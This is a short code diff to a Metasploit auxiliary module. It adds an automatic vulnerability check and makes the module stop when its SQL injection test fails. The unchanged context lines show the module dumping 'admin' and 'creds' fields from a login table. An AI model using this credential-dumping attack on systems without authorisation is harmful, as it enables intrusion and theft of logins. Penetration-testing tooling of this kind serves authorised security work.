@@ -4,6 +4,7 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
+  prepend Msf::Exploit::Remote::AutoCheck
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::SQLi
@@ -74,10 +75,8 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Connection failed') unless res
     end
 
-    unless @sqli.test_vulnerable
-      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
-      return
-    end
+    fail_with(Failure::NotVulnerable, "#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.") unless @sqli.test_vulnerable
+
     columns = ['admin', 'creds']
     vprint_status('Dumping login table')
     data = @sqli.dump_table_fields('master', columns, '')
